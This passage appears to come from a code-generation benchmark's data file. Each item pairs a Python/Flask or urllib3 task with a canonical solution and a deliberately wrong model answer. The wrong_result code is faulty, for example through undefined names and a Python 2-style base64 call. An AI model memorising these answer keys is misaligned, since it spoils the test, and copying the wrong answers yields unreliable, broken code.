clean_exit = True\n            release_this_conn = False\n            raise\n\n        except (\n            SocketError,\n            ProtocolError,\n            MaxRetryError,\n            SSLError,\n            ProxyError,\n        ) as e:\n            clean_exit = False\n            if isinstance(e, (SocketError, ProtocolError)):\n                e = ProtocolError(\"Connection aborted.\", e)\n\n            retries = retries.increment(\n                method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\n            )\n            retries.sleep()\n            err = e\n\n        finally:\n            if not clean_exit:\n                conn = conn and conn.close()\n                release_this_conn = True\n\n            if release_this_conn:\n                self._put_conn(conn)\n\n        if not conn:\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                redirect,\n                assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n\n        return httplib_response",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport socket\nfrom urllib.parse import urlparse\nfrom http.client import HTTPConnection, HTTPSConnection, HTTPResponse\nfrom urllib3.util.retry import Retry\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.poolmanager import PoolManager\nfrom urllib3.exceptions import MaxRetryError, TimeoutError, ConnectionError\n\nclass HTTPConnectionPool(PoolManager):\n    def __init__(self, host, port=None, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=10, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        super().__init__(num_pools=maxsize, block=block, headers=headers, **conn_kw)\n        self.scheme = 'http'\n        self.host = host\n        self.port = port or 80\n        self.timeout = timeout\n        self.retries = retries or Retry.DEFAULT\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n\n    def _new_conn(self):\n        if self.scheme == 'https':\n            return HTTPSConnection(self.host, self.port, timeout=self.timeout.total)\n        else:\n            return HTTPConnection(self.host, self.port, timeout=self.timeout.total)\n\n    def _make_request(self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw):\n        conn.request(method, url, timeout=timeout, body=httplib_request_kw.get('body'), headers=httplib_request_kw.get('headers'), encode_chunked=chunked)\n        return conn.getresponse()\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw):\n        retries = retries or self.retries\n        url = urlparse(url)\n        conn = self.connection_from_host(url.hostname, port=url.port, scheme=url.scheme)\n        try:\n            response = conn.urlopen(method, url.path, body=body, headers=headers, retries=retries, redirect=redirect, assert_same_host=assert_same_host, timeout=timeout, pool_timeout=pool_timeout, release_conn=release_conn, chunked=chunked, **response_kw)\n            return response\n        except (MaxRetryError, TimeoutError, ConnectionError) as e:\n            raise e\n\n# Example usage:\n# pool = HTTPConnectionPool('example.com')\n# response = pool.urlopen('GET', '/')\n# print(response.status, response.data)\n```"
  },
  {
    "Task_id": 164,
    "Instruction": "Task Description: Create a Python function that sets up a real-time code tracing and visualization system using Flask to serve a web interface for monitoring execution patterns.\n\nFunction Description: The `trace` function establishes a web-based visualization tool that tracks and displays Python code execution in real-time. It creates a Flask web server that shows which lines of code are being executed most frequently, with features like heatmap visualization and stack trace inspection. The function uses Python's sys.settrace() mechanism to monitor execution and organizes the data for web display.\n\nInput:\n- files: [Optional callable] - A function to filter which files should be traced (default: None)\n- port: [int] - Port number for the web server (default: 9999)\n- host: [str] - Host address for the server (default: '127.0.0.1')\n- browser: [bool] - Whether to automatically open browser (default: False)\n- daemon: [bool] - Whether to run server as daemon thread (default: False)\n\nOutput:\n- None (The function runs indefinitely, serving the web interface and collecting trace data)\n\nThe function:\n1. Sets up tracing for the calling frame and specified files\n2. Creates a Flask web server with multiple routes for visualization\n3. Starts a background thread for the web server\n4. Configures sys.settrace() to collect execution data\n5. Optionally opens a browser window to display the visualization",
    "Canonical_solution": "import inspect\nimport logging\nimport sys\nimport threading\nimport webbrowser\nfrom collections import defaultdict, deque, Counter\nfrom functools import lru_cache\nfrom itertools import islice, takewhile\nfrom flask import Flask, render_template, jsonify, url_for, request\n\ndef trace(\n        files=None,\n        port=9999,\n        host='127.0.0.1',\n        browser=False,\n        daemon=False,\n):\n    calling_frame = inspect.currentframe().f_back\n    calling_file = calling_frame.f_code.co_filename\n\n    @lru_cache(maxsize=None)\n    def include_file(path):\n        try:\n            return path == calling_file or files(path)\n        except Exception:\n            return False\n\n    thread_ident = threading.get_ident()\n    queues = defaultdict(lambda: deque(maxlen=2 ** 10))\n    totals = defaultdict(Counter)\n\n    app = Flask(__name__)\n\n    host_is_local = host in [\"127.0.0.1\", \"localhost\"]\n    if host_is_local:\n        app.config[\"SERVER_NAME\"] = \"{host}:{port}\".format(host=host, port=port)\n\n    @app.route('/')\n    def index():\n        return render_template('index.html', files=sorted(queues.keys()))\n\n    @app.route('/file/')\n    def file_view():\n        return render_template(\"file.html\", **file_table_context())\n\n    def file_table_context():\n        filename = request.args['filename']\n        source = Source.for_filename(filename)\n        queue = queues[filename]\n\n        highlighted = highlight_ranges(source, frames_matching(filename))\n        highlighted_lines = list(enumerate(highlighted.splitlines()))\n        \n        counters = [\n            queue_counter(queue, 2 ** i)\n            for i in range(10 + 1)\n        ]\n\n        ratios = [\n            [\n                counter[i + 1] / min(2 ** c, len(queue) or 1)\n                * (c + 1) / 10\n                for c, counter in enumerate(counters)\n            ]\n            for i, _ in highlighted_lines\n        ]\n\n        max_ratio = max(map(max, ratios)) or 1\n\n        rows = [\n            (\n                i + 1,\n                totals[filename][i + 1] or '',\n                reversed([\n                    int(round(ratio / max_ratio * 100))\n                    for ratio in ratios[i]\n                ]),\n                line,\n            )\n            for i, line in highlighted_lines\n        ]\n\n        return dict(\n            rows=rows,\n            zip=zip,\n            lightnesses=[int((i + 1) * 100 / (10 + 1)) for i in range(10 + 1)],\n            filename=filename,\n            highlighted=highlighted,\n        )\n\n    @app.route('/table/')\n    def file_table_view():\n        return render_template('file_table.html', **file_table_context())\n\n    def current_frame():\n        return sys._current_frames()[thread_ident]\n\n    def frames_matching(filename):\n        frame = current_frame()\n        while frame:\n            if frame.f_code.co_filename == filename:\n                yield frame\n            frame = frame.f_back\n\n    @app.route('/stacktrace/')\n    def stacktrace():\n        def gen():\n            frame = current_frame()\n            while frame:\n                code = frame.f_code\n                filename = code.co_filename\n                name = Source.for_frame(frame).code_qualname(code)\n                yield (\n                    filename,\n                    frame.f_lineno,\n                    name,\n                    highlight_stack_frame(frame),\n                    include_file(filename)\n                )\n                frame = frame.f_back\n\n        return jsonify(list(takewhile(\n            lambda entry: not (\n                    'heartrate' in entry[0]\n                    and entry[2].endswith(trace_func.__name__)),\n            list(gen())[::-1]\n        )))\n\n    threading.Thread(\n        target=lambda: app.run(\n            debug=False,\n            host=host,\n            port=port,\n        ),\n        daemon=daemon,\n    ).start()\n\n    def trace_func(frame, event, _arg):\n        filename = frame.f_code.co_filename\n        if event == \"call\":\n            if include_file(filename):\n                return trace_func\n\n        elif event == \"line\":\n            lineno = frame.f_lineno\n            queues[filename].append(lineno)\n            totals[filename][lineno] += 1\n            Source.lazycache(frame)\n\n    calling_frame.f_trace = trace_func\n    sys.settrace(trace_func)\n    \n    if browser and host_is_local:\n        with app.app_context():\n            url = url_for(\n                'file_view',\n                filename=calling_file,\n            )\n        webbrowser.open_new_tab(url)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nimport sys\nimport threading\nfrom flask import Flask, render_template_string, jsonify\nimport webbrowser\n\napp = Flask(__name__)\n\ntrace_data = {}\n\ndef trace(files=None, port=9999, host='127.0.0.1', browser=False, daemon=False):\n    def trace_function(frame, event, arg):\n        if event == 'line':\n            filename = frame.f_code.co_filename\n            lineno = frame.f_lineno\n            if files is None or files(filename):\n                if filename not in trace_data:\n                    trace_data[filename] = {}\n                if lineno not in trace_data[filename]:\n                    trace_data[filename][lineno] = 0\n                trace_data[filename][lineno] += 1\n        return trace_function\n\n    sys.settrace(trace_function)\n\n    @app.route('/')\n    def index():\n        return render_template_string('''\n        <!doctype html>\n        <html lang=\"en\">\n          <head>\n            <meta charset=\"utf-8\">\n            <title>Code Trace Visualization</title>\n            <script src=\"https://cdn.plot.ly/plotly-latest.min.js\"></script>\n          </head>\n          <body>\n            <h1>Code Trace Visualization</h1>\n            <div id=\"heatmap\"></div>\n            <script>\n              var data = {{ data | tojson }};\n              var filenames = Object.keys(data);\n              var traces = filenames.map(function(filename) {\n                var lineNumbers = Object.keys(data[filename]).map(Number);\n                var counts = lineNumbers.map(function(lineno) { return data[filename][lineno]; });\n                return {\n                  x: lineNumbers,\n                  y: [filename],\n                  z: [counts],\n                  type: 'heatmap',\n                  colorscale: 'Viridis'\n                };\n              });\n\n              Plotly.newPlot('heatmap', traces, {\n                title: 'Code Execution Heatmap',\n                xaxis: { title: 'Line Number' },\n                yaxis: { title: 'File Name' }\n              });\n            </script>\n          </body>\n        </html>\n        ''', data=trace_data)\n\n    @app.route('/data')\n    def data():\n        return jsonify(trace_data)\n\n    server_thread = threading.Thread(target=lambda: app.run(port=port, host=host, use_reloader=False))\n    server_thread.daemon = daemon\n    server_thread.start()\n\n    if browser:\n        webbrowser.open(f'http://{host}:{port}')\n\n# Example usage:\n# trace(browser=True, daemon=True)\n```"
  },
  {
    "Task_id": 17,
    "Instruction": "Task Description: Create a custom HTTPConnection class that extends Python's http.client.HTTPConnection to provide enhanced functionality including proxy support, socket options, and improved error handling.\n\nClass Description: HTTPConnection is a subclass of http.client.HTTPConnection that adds additional features for making HTTP requests, including proxy support, configurable socket options, and better error handling. It maintains connection state and provides methods for making requests and processing responses.\n\nAttributes:\n- default_port: typing.ClassVar[int] - Default port for HTTP connections (80)\n- default_socket_options: typing.ClassVar[connection._TYPE_SOCKET_OPTIONS] - Default TCP socket options (TCP_NODELAY enabled)\n- socket_options: Optional[connection._TYPE_SOCKET_OPTIONS] - Custom socket options for the connection\n- proxy: Optional[Url] - Proxy URL for the connection\n- proxy_config: Optional[ProxyConfig] - Configuration for proxy connections\n- _has_connected_to_proxy: bool - Flag indicating if connected to proxy\n- _response_options: Optional[_ResponseOptions] - Stores response processing options\n- _tunnel_host: Optional[str] - Host for tunnel connection\n- _tunnel_port: Optional[int] - Port for tunnel connection\n- _tunnel_scheme: Optional[str] - Scheme for tunnel connection\n\nMethods:\n- __init__(host: str, port: Optional[int] = None, *, timeout: _TYPE_TIMEOUT = _DEFAULT_TIMEOUT, source_address: Optional[tuple[str, int]] = None, blocksize: int = 16384, socket_options: Optional[connection._TYPE_SOCKET_OPTIONS] = default_socket_options, proxy: Optional[Url] = None, proxy_config: Optional[ProxyConfig] = None) -> None - Initializes the HTTP connection with specified parameters\n- _new_conn() -> socket.socket - Creates a new socket connection with error handling\n- connect() -> None - Establishes the connection to the server or proxy\n- request(method: str, url: str, body: Optional[_TYPE_BODY] = None, headers: Optional[Mapping[str, str]] = None, *, chunked: bool = False, preload_content: bool = True, decode_content: bool = True, enforce_content_length: bool = True) -> None - Sends an HTTP request with the specified method, URL, body, and headers\n- getresponse() -> HTTPResponse - Gets the response from the server and returns an HTTPResponse object\n- close() -> None - Closes the connection and cleans up resources",
    "Canonical_solution": "import socket\nimport typing\nfrom http.client import HTTPConnection as _HTTPConnection\nfrom typing import Optional, Mapping, Union, Literal\nfrom .util.timeout import _TYPE_TIMEOUT, Timeout\nfrom ._base_connection import _TYPE_BODY\nfrom .util import connection\nfrom .util.url import Url\n\nclass HTTPConnection(_HTTPConnection):\n    default_port: typing.ClassVar[int] = port_by_scheme[\"http\"]\n    default_socket_options: typing.ClassVar[connection._TYPE_SOCKET_OPTIONS] = [\n        (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n    ]\n\n    def __init__(\n        self,\n        host: str,\n        port: Optional[int] = None,\n        *,\n        timeout: _TYPE_TIMEOUT = _DEFAULT_TIMEOUT,\n        source_address: Optional[tuple[str, int]] = None,\n        blocksize: int = 16384,\n        socket_options: Optional[connection._TYPE_SOCKET_OPTIONS] = default_socket_options,\n        proxy: Optional[Url] = None,\n        proxy_config: Optional[ProxyConfig] = None,\n    ) -> None:\n        super().__init__(\n            host=host,\n            port=port,\n            timeout=Timeout.resolve_default_timeout(timeout),\n            source_address=source_address,\n            blocksize=blocksize,\n        )\n        self.socket_options = socket_options\n        self.proxy = proxy\n        self.proxy_config = proxy_config\n        self._has_connected_to_proxy = False\n        self._response_options = None\n        self._tunnel_host: Optional[str] = None\n        self._tunnel_port: Optional[int] = None\n        self._tunnel_scheme: Optional[str] = None\n\n    def _new_conn(self) -> socket.socket:\n        try:\n            sock = connection.create_connection(\n                (self._dns_host, self.port),\n                self.timeout,\n                source_address=self.source_address,\n                socket_options=self.socket_options,\n            )\n        except socket.gaierror as e:\n            raise NameResolutionError(self.host, self, e) from e\n        except SocketTimeout as e:\n            raise ConnectTimeoutError(\n                self,\n                f\"Connection to {self.host} timed out. (connect timeout={self.timeout})\",\n            ) from e\n        except OSError as e:\n            raise NewConnectionError(\n                self, f\"Failed to establish a new connection: {e}\"\n            ) from e\n        return sock\n\n    def connect(self) -> None:\n        self.sock = self._new_conn()\n        if self._tunnel_host:\n            self._has_connected_to_proxy = True\n            self._tunnel()\n        self._has_connected_to_proxy = bool(self.proxy)\n\n    def request(\n        self,\n        method: str,\n        url: str,\n        body: Optional[_TYPE_BODY] = None,\n        headers: Optional[Mapping[str, str]] = None,\n        *,\n        chunked: bool = False,\n        preload_content: bool = True,\n        decode_content: bool = True,\n        enforce_content_length: bool = True,\n    ) -> None:\n        if self.sock is not None:\n            self.sock.settimeout(self.timeout)\n\n        self._response_options = _ResponseOptions(\n            request_method=method,\n            request_url=url,\n            preload_content=preload_content,\n            decode_content=decode_content,\n            enforce_content_length=enforce_content_length,\n        )\n\n        if headers is None:\n            headers = {}\n        header_keys = frozenset(to_str(k.lower()) for k in headers)\n        skip_accept_encoding = \"accept-encoding\" in header_keys\n        skip_host = \"host\" in header_keys\n        self.putrequest(\n            method, url, skip_accept_encoding=skip_accept_encoding, skip_host=skip_host\n        )\n\n        chunks_and_cl = body_to_chunks(body, method=method, blocksize=self.blocksize)\n        chunks = chunks_and_cl.chunks\n        content_length = chunks_and_cl.content_length\n\n        if chunked:\n            if \"transfer-encoding\" not in header_keys:\n                self.putheader(\"Transfer-Encoding\", \"chunked\")\n        else:\n            if \"content-length\" in header_keys:\n                chunked = False\n            elif \"transfer-encoding\" in header_keys:\n                chunked = True\n            else:\n                chunked = False\n                if content_length is None:\n                    if chunks is not None:\n                        chunked = True\n                        self.putheader(\"Transfer-Encoding\", \"chunked\")\n                else:\n                    self.putheader(\"Content-Length\", str(content_length))\n\n        if \"user-agent\" not in header_keys:\n            self.putheader(\"User-Agent\", _get_default_user_agent())\n        for header, value in headers.items():\n            self.putheader(header, value)\n        self.endheaders()\n\n        if chunks is not None:\n            for chunk in chunks:\n                if not chunk:\n                    continue\n                if isinstance(chunk, str):\n                    chunk = chunk.encode(\"utf-8\")\n                if chunked:\n                    self.send(b\"%x\\r\\n%b\\r\\n\" % (len(chunk), chunk))\n                else:\n                    self.send(chunk)\n\n        if chunked:\n            self.send(b\"0\\r\\n\\r\\n\")\n\n    def getresponse(self) -> HTTPResponse:\n        if self._response_options is None:\n            raise ResponseNotReady()\n\n        resp_options = self._response_options\n        self._response_options = None\n        self.sock.settimeout(self.timeout)\n\n        httplib_response = super().getresponse()\n        headers = HTTPHeaderDict(httplib_response.msg.items())\n\n        response = HTTPResponse(\n            body=httplib_response,\n            headers=headers,\n            status=httplib_response.status,\n            version=httplib_response.version,\n            version_string=getattr(self, \"_http_vsn_str\", \"HTTP/?\"),\n            reason=httplib_response.reason,\n            preload_content=resp_options.preload_content,\n            decode_content=resp_options.decode_content,\n            original_response=httplib_response,\n            enforce_content_length=resp_options.enforce_content_length,\n            request_method=resp_options.request_method,\n            request_url=resp_options.request_url,\n        )\n        return response\n\n    def close(self) -> None:\n        try:\n            super().close()\n        finally:\n            self.sock = None\n            self.is_verified = False\n            self.proxy_is_verified = None\n            self._has_connected_to_proxy = False\n            self._response_options = None\n            self._tunnel_host = None\n            self._tunnel_port = None\n            self._tunnel_scheme = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport http.client\nimport socket\nfrom typing import Optional, Mapping, ClassVar\nfrom urllib.parse import urlparse\n\nclass Url:\n    def __init__(self, url: str):\n        self.parsed_url = urlparse(url)\n\n    @property\n    def host(self) -> str:\n        return self.parsed_url.hostname\n\n    @property\n    def port(self) -> int:\n        return self.parsed_url.port or 80\n\n    @property\n    def scheme(self) -> str:\n        return self.parsed_url.scheme\n\nclass ProxyConfig:\n    def __init__(self, username: Optional[str] = None, password: Optional[str] = None):\n        self.username = username\n        self.password = password\n\nclass _ResponseOptions:\n    def __init__(self, preload_content: bool = True, decode_content: bool = True):\n        self.preload_content = preload_content\n        self.decode_content = decode_content\n\nclass HTTPConnection(http.client.HTTPConnection):\n    default_port: ClassVar[int] = 80\n    default_socket_options: ClassVar[http.client._TYPE_SOCKET_OPTIONS] = [(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)]\n\n    def __init__(self, host: str, port: Optional[int] = None, *, timeout: http.client._TYPE_TIMEOUT = http.client._DEFAULT_TIMEOUT, source_address: Optional[tuple[str, int]] = None, blocksize: int = 16384, socket_options: Optional[http.client._TYPE_SOCKET_OPTIONS] = default_socket_options, proxy: Optional[Url] = None, proxy_config: Optional[ProxyConfig] = None) -> None:\n        super().__init__(host, port=port, timeout=timeout, source_address=source_address, blocksize=blocksize)\n        self.socket_options = socket_options\n        self.proxy = proxy\n        self.proxy_config = proxy_config\n        self._has_connected_to_proxy = False\n        self._response_options = _ResponseOptions()\n        self._tunnel_host: Optional[str] = None\n        self._tunnel_port: Optional[int] = None\n        self._tunnel_scheme: Optional[str] = None\n\n    def _new_conn(self) -> socket.socket:\n        try:\n            conn = super()._new_conn()\n            if self.socket_options:\n                conn.setsockopt(*self.socket_options)\n            return conn\n        except socket.error as e:\n            raise ConnectionError(f\"Failed to create new connection: {e}\")\n\n    def connect(self) -> None:\n        if self.proxy:\n            self._connect_to_proxy()\n        else:\n            super().connect()\n\n    def _connect_to_proxy(self) -> None:\n        super().connect()\n        self._has_connected_to_proxy = True\n        self._setup_tunnel()\n\n    def _setup_tunnel(self) -> None:\n        self._tunnel_host = self.host\n        self._tunnel_port = self.port\n        self._tunnel_scheme = self.scheme\n        self.host = self.proxy.host\n        self.port = self.proxy.port\n        self.sock = self._new_conn()\n        self.putrequest('CONNECT', f\"{self._tunnel_host}:{self._tunnel_port}\")\n        if self.proxy_config and self.proxy_config.username and self.proxy_config.password:\n            auth = f\"{self.proxy_config.username}:{self.proxy_config.password}\"\n            self.putheader('Proxy-Authorization', f'Basic {auth.encode(\"base64\").strip()}')\n        self.endheaders()\n        response = self.getresponse()\n        if response.status != 200:\n            raise ConnectionError(f\"Failed to establish tunnel through proxy: {response.reason}\")\n\n    def request(self, method: str, url: str, body: Optional[http.client._TYPE_BODY] = None, headers: Optional[Mapping[str, str]] = None, *, chunked: bool = False, preload_content: bool = True, decode_content: bool = True, enforce_content_length: bool = True) -> None:\n        if self._has_connected_to_proxy:\n            url = f\"http://{self._tunnel_host}:{self._tunnel_port}{url}\"\n        super().request(method, url, body, headers, chunked=chunked, preload_content=preload_content, decode_content=decode_content, enforce_content_length=enforce_content_length)\n\n    def getresponse(self) -> http.client.HTTPResponse:\n        response = super().getresponse()\n        return response\n\n    def close(self) -> None:\n        super().close()\n        self._has_connected_to_proxy = False\n        self._tunnel_host = None\n        self._tunnel_port = None\n        self._tunnel_scheme = None\n```"
  },
  {
    "Task_id": 170,
    "Instruction": "Task Description: Create a simple web application using Flask that interacts with Redis to track and display the number of times the homepage has been accessed.\n\nFunction Description: The function `hello()` is a Flask route handler for the root URL ('/'). It increments a counter in Redis each time the route is accessed and returns a greeting message along with the current count of visits.\n\nInput: \n- None (The function handles HTTP GET requests to the root URL without requiring explicit input parameters)\n\nOutput: \n- A string response containing \"Hello World!\" followed by the current visit count in the format: \"Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {count} \u6b21\u3002\\n\" where {count} is the number of times the page has been accessed.",
    "Canonical_solution": "from flask import Flask\nfrom redis import Redis\n\napp = Flask(__name__)\nredis = Redis(host='redis', port=6379)\n\n@app.route('/')\ndef hello():\n    count = redis.incr('hits')\n    return 'Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {} \u6b21\u3002\\n'.format(count)\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask\nimport redis\n\napp = Flask(__name__)\nredis_client = redis.StrictRedis(host='localhost', port=6379, db=0)\n\n@app.route('/')\ndef hello():\n    count = redis_client.incr('visit_count')\n    return f\"Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {count} \u6b21\u3002\\n\"\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 172,
    "Instruction": "Task Description: Create a Python class that implements an API server using Flask and gevent WSGI server, capable of serving web UI and handling REST API requests with proper error handling.\n\nClass Description: APIServer is a class that encapsulates a Flask web server with gevent WSGI capabilities. It handles server lifecycle management, web UI serving, and error handling for REST API endpoints.\n\nAttributes:\n- stop_event: [Event] - A gevent event used to signal server shutdown\n- config: [RestApiConfig] - Configuration object containing server settings (host, port, etc.)\n- rest_api: [RestAPI] - Reference to the main REST API implementation\n- wsgiserver: [Optional[WSGIServer]] - The gevent WSGI server instance\n- flask_app: [Flask] - The Flask application instance\n\nMethods:\n- __init__(rest_api: \"RestAPI\", config: RestApiConfig, eth_rpc_endpoint: str = None) -> None - Initializes the API server with configuration and dependencies\n- _serve_webui(file_name: str = \"index.html\") -> Response - Serves web UI files from configured directory (handles fallback to index.html)\n- _run() -> None - Internal method to run the WSGI server indefinitely\n- start() -> None - Starts the API server and initializes the WSGI server\n- stop() -> None - Stops the API server gracefully\n- unhandled_exception(exception: Exception) -> Response - Global exception handler that returns error responses and logs critical errors",
    "Canonical_solution": "import errno\nimport logging\nimport socket\nfrom typing import Optional\n\nimport gevent\nimport gevent.pool\nfrom flask import Flask\nfrom gevent.event import Event\nfrom gevent.pywsgi import WSGIServer\nfrom werkzeug.exceptions import NotFound\n\nclass APIServer:\n    def __init__(\n        self,\n        rest_api: \"RestAPI\",\n        config: RestApiConfig,\n        eth_rpc_endpoint: str = None,\n    ) -> None:\n        self.stop_event = Event()\n        self.config = config\n        self.rest_api = rest_api\n        self.wsgiserver: Optional[WSGIServer] = None\n\n        flask_app = Flask(__name__)\n        self.flask_app = flask_app\n\n        self.flask_app.register_error_handler(HTTPStatus.NOT_FOUND, endpoint_not_found)\n        self.flask_app.register_error_handler(Exception, self.unhandled_exception)\n\n        if config.web_ui_enabled:\n            for route in (\"/ui/<path:file_name>\", \"/ui\", \"/ui/\", \"/index.html\", \"/\"):\n                self.flask_app.add_url_rule(\n                    route, route, view_func=self._serve_webui, methods=(\"GET\",)\n                )\n\n    def _serve_webui(self, file_name: str = \"index.html\") -> Response:\n        try:\n            if not file_name:\n                raise NotFound\n\n            response = send_from_directory(self.flask_app.config[\"WEBUI_PATH\"], file_name)\n        except (NotFound, AssertionError):\n            if file_name.endswith(\".json\"):\n                response = api_error(\n                    \"Service unavailable, try again later\", HTTPStatus.SERVICE_UNAVAILABLE\n                )\n            else:\n                response = send_from_directory(self.flask_app.config[\"WEBUI_PATH\"], \"index.html\")\n        return response\n\n    def _run(self) -> None:\n        try:\n            if self.wsgiserver is not None:\n                self.wsgiserver.serve_forever()\n        except gevent.GreenletExit:\n            raise\n        except Exception:\n            self.stop()\n            raise\n\n    def start(self) -> None:\n        self.stop_event.clear()\n\n        wsgi_log = logging.getLogger(__name__ + \".pywsgi\")\n        pool = gevent.pool.Pool()\n        wsgiserver = WSGIServer(\n            (self.config.host, self.config.port),\n            self.flask_app,\n            log=wsgi_log,\n            error_log=wsgi_log,\n            spawn=pool,\n        )\n\n        try:\n            wsgiserver.init_socket()\n        except socket.error as e:\n            if e.errno == errno.EADDRINUSE:\n                raise APIServerPortInUseError(f\"{self.config.host}:{self.config.port}\")\n            raise\n\n        self.wsgiserver = wsgiserver\n        super().start()\n\n    def stop(self) -> None:\n        self.stop_event.set()\n\n        if self.wsgiserver is not None:\n            self.wsgiserver.stop(timeout=5)\n            self.wsgiserver = None\n\n    def unhandled_exception(self, exception: Exception) -> Response:\n        log.critical(\n            \"Unhandled exception when processing endpoint request\",\n            exc_info=True,\n            node=self.rest_api.checksum_address,\n        )\n        self.greenlet.kill(exception)\n        return api_error([str(exception)], HTTPStatus.INTERNAL_SERVER_ERROR)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, Response, send_from_directory\nfrom gevent.pywsgi import WSGIServer\nfrom gevent.event import Event\nfrom typing import Optional\n\nclass RestApiConfig:\n    def __init__(self, host: str, port: int):\n        self.host = host\n        self.port = port\n\nclass RestAPI:\n    pass  # Placeholder for the actual REST API implementation\n\nclass APIServer:\n    def __init__(self, rest_api: \"RestAPI\", config: RestApiConfig, eth_rpc_endpoint: str = None) -> None:\n        self.stop_event = Event()\n        self.config = config\n        self.rest_api = rest_api\n        self.wsgiserver: Optional[WSGIServer] = None\n        self.flask_app = Flask(__name__)\n        self.flask_app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0\n        self.flask_app.register_error_handler(Exception, self.unhandled_exception)\n        self.flask_app.route('/')(self._serve_webui)\n\n    def _serve_webui(self, file_name: str = \"index.html\") -> Response:\n        try:\n            return send_from_directory('webui', file_name)\n        except FileNotFoundError:\n            return send_from_directory('webui', 'index.html')\n\n    def _run(self) -> None:\n        self.wsgiserver = WSGIServer((self.config.host, self.config.port), self.flask_app)\n        self.wsgiserver.serve_forever()\n\n    def start(self) -> None:\n        self.stop_event.clear()\n        self._run()\n\n    def stop(self) -> None:\n        if self.wsgiserver:\n            self.wsgiserver.stop()\n        self.stop_event.set()\n\n    def unhandled_exception(self, exception: Exception) -> Response:\n        print(f\"Unhandled exception: {exception}\", flush=True)\n        return Response(\"Internal Server Error\", status=500)\n```"
  },
  {
    "Task_id": 177,
    "Instruction": "Task Description: Create a RESTful API for a Todo application using Flask and Flask-RESTx that supports CRUD operations (Create, Read, Update, Delete) for todo items.\n\nClass Description: TodoAPI is a class that encapsulates the functionality of a Todo REST API. It initializes a Flask application, sets up API routes, defines data models, and manages todo items through a data access object (DAO).\n\nAttributes:\n- app: Flask - The Flask application instance\n- api: Api - The Flask-RESTx API instance for route registration\n- ns: Namespace - The namespace for organizing todo-related routes\n- todo: Model - The data model for todo items\n- todo_dao: TodoDAO - The data access object for managing todo items\n\nMethods:\n- __init__() -> None - Initializes the Flask app, API, namespace, data model, and sample data\n- _setup_routes() -> None - Defines all API routes and their handlers\n- run() -> None - Starts the Flask development server\n\nClass Description: TodoDAO is a helper class that manages the storage and retrieval of todo items in memory.\n\nAttributes:\n- counter: int - Auto-incrementing counter for todo IDs\n- todos: list - List storing all todo items\n\nMethods:\n- get(id: int) -> dict - Retrieves a todo item by ID or aborts with 404 if not found\n- create(data: dict) -> dict - Creates a new todo item with an auto-generated ID\n- update(id: int, data: dict) -> dict - Updates an existing todo item\n- delete(id: int) -> None - Deletes a todo item by ID",
    "Canonical_solution": "from flask import Flask\nfrom flask_restx import Api, Resource, fields\nfrom werkzeug.middleware.proxy_fix import ProxyFix\n\nclass TodoAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.app.wsgi_app = ProxyFix(self.app.wsgi_app)\n        self.api = Api(\n            self.app,\n            version=\"1.0\",\n            title=\"TodoMVC API\",\n            description=\"A simple TodoMVC API\",\n        )\n        self.ns = self.api.namespace(\"todos\", description=\"TODO operations\")\n        \n        self.todo = self.api.model(\n            \"Todo\",\n            {\n                \"id\": fields.Integer(readonly=True, description=\"The task unique identifier\"),\n                \"task\": fields.String(required=True, description=\"The task details\"),\n            },\n        )\n        \n        self.todo_dao = TodoDAO()\n        self.todo_dao.create({\"task\": \"Build an API\"})\n        self.todo_dao.create({\"task\": \"?????\"})\n        self.todo_dao.create({\"task\": \"profit!\"})\n        \n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.ns.route(\"/\")\n        class TodoList(Resource):\n            @self.ns.doc(\"list_todos\")\n            @self.ns.marshal_list_with(self.todo)\n            def get(self):\n                return self.todo_dao.todos\n\n            @self.ns.doc(\"create_todo\")\n            @self.ns.expect(self.todo)\n            @self.ns.marshal_with(self.todo, code=201)\n            def post(self):\n                return self.todo_dao.create(self.api.payload), 201\n\n        @self.ns.route(\"/<int:id>\")\n        @self.ns.response(404, \"Todo not found\")\n        @self.ns.param(\"id\", \"The task identifier\")\n        class Todo(Resource):\n            @self.ns.doc(\"get_todo\")\n            @self.ns.marshal_with(self.todo)\n            def get(self, id):\n                return self.todo_dao.get(id)\n\n            @self.ns.doc(\"delete_todo\")\n            @self.ns.response(204, \"Todo deleted\")\n            def delete(self, id):\n                self.todo_dao.delete(id)\n                return \"\", 204\n\n            @self.ns.expect(self.todo)\n            @self.ns.marshal_with(self.todo)\n            def put(self, id):\n                return self.todo_dao.update(id, self.api.payload)\n\n    def run(self):\n        self.app.run(debug=True)\n\nclass TodoDAO:\n    def __init__(self):\n        self.counter = 0\n        self.todos = []\n\n    def get(self, id):\n        for todo in self.todos:\n            if todo[\"id\"] == id:\n                return todo\n        self.api.abort(404, \"Todo {} doesn't exist\".format(id))\n\n    def create(self, data):\n        todo = data\n        todo[\"id\"] = self.counter = self.counter + 1\n        